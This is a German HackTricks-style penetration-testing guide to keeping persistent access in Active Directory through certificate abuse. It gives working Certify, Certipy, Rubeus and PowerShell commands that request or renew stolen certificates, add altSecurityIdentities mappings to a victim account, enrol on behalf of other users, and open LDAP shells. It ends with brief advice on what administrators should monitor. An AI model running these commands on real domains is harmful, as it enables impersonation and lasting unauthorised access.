# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Dies ist eine kurze Zusammenfassung der Kapitel zur Account Persistence aus der hervorragenden Recherche unter [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**<sup>[[7]](#references)</sup>

## Diebstahl von Credentials aktiver Benutzer mit Certificates – PERSIST1

In einem Szenario, in dem ein Certificate, das eine Domain-Authentifizierung ermöglicht, von einem Benutzer angefordert werden kann, hat ein Angreifer die Möglichkeit, dieses Certificate anzufordern und zu stehlen, um die Persistence in einem Netzwerk aufrechtzuerhalten. Standardmäßig erlaubt das `User`-Template in Active Directory solche Anfragen, allerdings kann dies manchmal deaktiviert sein.<sup>[[3]](#references)[[7]](#references)</sup>

Mit [Certify](https://github.com/GhostPack/Certify) oder [Certipy](https://github.com/ly4k/Certipy) kannst du nach aktivierten Templates suchen, die Client-Authentifizierung erlauben, und anschließend eines anfordern:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Die Stärke eines Zertifikats liegt darin, dass es die Authentifizierung als der Benutzer ermöglicht, dem es gehört, unabhängig von Passwortänderungen, solange das Zertifikat gültig bleibt.

Du kannst PEM in PFX konvertieren und es verwenden, um ein TGT zu erhalten:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Hinweis: In Kombination mit anderen Techniken (siehe THEFT-Abschnitte) ermöglicht zertifikatsbasierte Authentifizierung dauerhaften Zugriff, ohne LSASS zu berühren, und sogar aus nicht erhöhten Kontexten.

## Erreichen von Maschinen-Persistenz mit Zertifikaten - PERSIST2

Wenn ein Angreifer über erhöhte Berechtigungen auf einem Host verfügt, kann er das Maschinenkonto des kompromittierten Systems mithilfe der standardmäßigen `Machine`-Vorlage für ein Zertifikat registrieren. Die Authentifizierung als Maschine aktiviert S4U2Self für lokale Dienste und kann dauerhafte Host-Persistenz ermöglichen:<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Persistenz durch Zertifikatserneuerung erweitern - PERSIST3

Das Ausnutzen der Gültigkeits- und Erneuerungszeiträume von Zertifikatvorlagen ermöglicht es einem Angreifer, langfristigen Zugriff aufrechtzuerhalten. Wenn du ein zuvor ausgestelltes Zertifikat und dessen privaten Schlüssel besitzt, kannst du es vor dem Ablauf erneuern, um ein neues, langlebiges Zugangsmerkmal zu erhalten, ohne zusätzliche Anfrageartefakte zu hinterlassen, die an den ursprünglichen Principal gebunden sind.<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Praxistipp: Verfolge die Gültigkeitsdauer von PFX-Dateien in Angreiferbesitz und erneuere sie frühzeitig. Durch die Erneuerung können aktualisierte Zertifikate auch die moderne SID-Mapping-Erweiterung enthalten, sodass sie unter strengeren DC-Mapping-Regeln weiterhin verwendbar bleiben (siehe nächsten Abschnitt).

## Explizite Zertifikatszuordnungen (altSecurityIdentities) setzen – PERSIST4

Wenn du in das Attribut `altSecurityIdentities` eines Zielkontos schreiben kannst, kannst du ein von einem Angreifer kontrolliertes Zertifikat explizit diesem Konto zuordnen. Diese Persistenz bleibt über Passwortänderungen hinweg bestehen und bleibt bei Verwendung starker Mapping-Formate auch unter moderner DC-Erzwingung funktionsfähig.<sup>[[2]](#references)</sup>

Ablauf auf hoher Ebene:

1. Beziehe ein von dir kontrolliertes Client-Authentifizierungszertifikat oder stelle eines aus (z. B. indem du das `User`-Template als du selbst enrollst).
2. Extrahiere eine starke Kennung aus dem Zertifikat (Issuer+Serial, SKI oder SHA1-PublicKey).
3. Füge mithilfe dieser Kennung eine explizite Zuordnung zum `altSecurityIdentities`-Attribut des Opfer-Principals hinzu.
4. Authentifiziere dich mit deinem Zertifikat; der DC ordnet es über die explizite Zuordnung dem Opfer zu.

Beispiel (PowerShell) mit einem starken Issuer+Serial-Mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Authentifiziere dich anschließend mit deinem PFX. Certipy erhält direkt ein TGT:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Aufbau starker `altSecurityIdentities`-Zuordnungen

In der Praxis sind **Issuer+Serial**- und **SKI**-Zuordnungen die am einfachsten aus einem vom Angreifer kontrollierten Zertifikat zu erstellenden starken Formate. Dies ist nach dem **11. Februar 2025** relevant, wenn DCs standardmäßig **Full Enforcement** verwenden und schwache Zuordnungen nicht mehr zuverlässig funktionieren.<sup>[[1]](#references)</sup>
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Hinweise
- Verwende nur starke Mapping-Typen: `X509IssuerSerialNumber`, `X509SKI` oder `X509SHA1PublicKey`. Schwache Formate (Subject/Issuer, nur Subject, RFC822-E-Mail) sind veraltet und können durch die DC-Richtlinie blockiert werden.
- Das Mapping funktioniert sowohl bei **Benutzer**- als auch bei **Computer**objekten. Daher reicht Schreibzugriff auf das `altSecurityIdentities`-Attribut eines Computerkontos aus, um dauerhaft als diese Maschine zu agieren.
- Die Zertifikatskette muss zu einer vom DC vertrauenswürdigen Root-CA führen. Enterprise-CAs in NTAuth werden typischerweise vertraut; manche Umgebungen vertrauen auch öffentlichen CAs.
- Schannel-Authentifizierung bleibt für Persistence nützlich, selbst wenn PKINIT fehlschlägt, weil dem DC die Smart Card Logon EKU fehlt oder er `KDC_ERR_PADATA_TYPE_NOSUPP` zurückgibt.

#### 2025+ explizite `Issuer/SID`-Mappings

Auf **Windows Server 2022+**-Domänencontrollern, die mit dem Sicherheitsupdate vom **9. September 2025** gepatcht wurden, hat Microsoft ein weiteres starkes Format für explizite Mappings hinzugefügt, das für Persistence attraktiv ist, weil es eine erneute Zertifikatsausstellung durch dieselbe CA übersteht:<sup>[[6]](#references)</sup>
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Operativ unterscheidet sich dies von den älteren starken Formaten:
- `Issuer+Serial` pinnt **ein exakt bestimmtes Zertifikat**.
- `SKI` / `SHA1-PUKEY` pinnen **ein Schlüsselpaar**.
- `Issuer/SID` pinnt **die ausstellende CA + die Ziel-SID**, sodass erneuerte oder neu ausgestellte Zertifikate derselben CA weiterhin funktionieren, ohne `altSecurityIdentities` neu schreiben zu müssen.

Anforderungen und Einschränkungen
- Das für den Logon präsentierte Zertifikat muss die SID des Zielkontos tatsächlich in der SID security extension enthalten.
- Dieses Format ist für Zertifikate im Stil von `ESC9` / `ESC16`, die die SID extension weglassen, nicht hilfreich; in diesen Fällen auf `Issuer+Serial`, `SKI` oder `SHA1-PUKEY` zurückgreifen.

Weitere Informationen zu schwachen expliziten Mappings und Angriffspfaden:

{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

Wenn du ein gültiges Certificate Request Agent/Enrollment Agent-Zertifikat erhältst, kannst du nach Belieben neue logon-fähige Zertifikate im Namen von Benutzern ausstellen und die Agent-PFX offline als Persistence-Token aufbewahren. Abuse-Workflow:<sup>[[7]](#references)</sup>
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Der Widerruf des Agentenzertifikats oder der Berechtigungen für die Vorlage ist erforderlich, um diese Persistenz zu entfernen.

## Betriebshinweise
- Moderne `Certipy`-Versionen unterstützen sowohl `-on-behalf-of` als auch `-renew`. Ein Angreifer mit einem Enrollment Agent PFX kann dadurch Leaf-Zertifikate ausstellen und später erneuern, ohne erneut auf das ursprüngliche Zielkonto zugreifen zu müssen.<sup>[[4]](#references)</sup>
- Wenn der Abruf eines TGT über PKINIT nicht möglich ist, kann das resultierende On-Behalf-of-Zertifikat weiterhin für die Schannel-Authentifizierung mit `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell` verwendet werden.<sup>[[5]](#references)</sup>

## Verwendung persistierter Zertifikate, wenn PKINIT fehlschlägt

Wenn der DC kein Smart-Card-Logon-fähiges Zertifikat besitzt, kann die Zertifikatanmeldung über PKINIT mit `KDC_ERR_PADATA_TYPE_NOSUPP` fehlschlagen. Das bedeutet **nicht**, dass der Persistenzmechanismus unbrauchbar ist: Dasselbe PFX kann häufig weiterhin für den Schannel-authentifizierten LDAP-Zugriff verwendet werden.<sup>[[5]](#references)</sup>
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Dies ist besonders nützlich nach PERSIST4/PERSIST5, da du weiterhin von Linux/macOS aus arbeiten und andere Verzeichnis-Persistence-Aktionen verketten kannst, beispielsweise das Ablegen von [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) oder das Bearbeiten beschreibbarer Delegierungsattribute.

## 2025 Strong Certificate Mapping Enforcement: Auswirkungen auf Persistence

Microsoft KB5014754 führte Strong Certificate Mapping Enforcement auf Domain Controllern ein. Seit dem **11. Februar 2025** verwenden DCs standardmäßig **Full Enforcement** für schwache/mehrdeutige Mappings, und seit dem Sicherheitsupdate vom **9. September 2025** unterstützen gepatchte DCs den alten Fallback im Compatibility-Modus nicht mehr.<sup>[[1]](#references)</sup> Praktische Auswirkungen:

- Zertifikate vor 2022, denen die SID-Mapping-Erweiterung fehlt, können beim impliziten Mapping fehlschlagen, wenn sich DCs im Full Enforcement befinden. Angreifer können den Zugriff aufrechterhalten, indem sie entweder Zertifikate über AD CS erneuern (um die SID-Erweiterung zu erhalten) oder ein starkes explizites Mapping in `altSecurityIdentities` platzieren (PERSIST4).
- Explizite Mappings mit starken Formaten (`Issuer+Serial`, `SKI`, `SHA1-PUKEY` und auf modernen DCs `Issuer/SID`) funktionieren weiterhin. Schwache Formate (Issuer/Subject, Subject-only, RFC822) können blockiert werden und sollten für Persistence vermieden werden.
- Wenn schwache Mappings weiterhin zu funktionieren scheinen, solltest du davon ausgehen, dass du einen ungepatchten oder anders konfigurierten DC erreicht hast, statt dies als zuverlässigen langfristigen Persistence-Pfad zu betrachten.
- `ESC9`-/`ESC16`-artige Ausstellungswege, die die SID-Erweiterung unterdrücken, machen `Issuer/SID` unbrauchbar. Daher sind Fallback-Mappings mit starken Formaten oder eine Erneuerung über ein normales Template die praktikable Persistence-Option.

Administratoren sollten Folgendes überwachen und entsprechende Alerts einrichten:
- Änderungen an `altSecurityIdentities` sowie die Ausstellung und Erneuerung von Enrollment-Agent- und User-Zertifikaten.
- CA-Ausstellungslogs auf On-Behalf-of-Anfragen und ungewöhnliche Erneuerungsmuster.

## Referenzen

- [1] [Microsoft Support – KB5014754: Änderungen an der zertifikatsbasierten Authentifizierung auf Windows-Domain-Controllern](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [3] [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [4] [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [5] [Almond Offensive Security – Authentifizierung mit Zertifikaten, wenn PKINIT nicht unterstützt wird](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [6] [Microsoft Community Hub – Einführung einer neuen Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
- [7] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
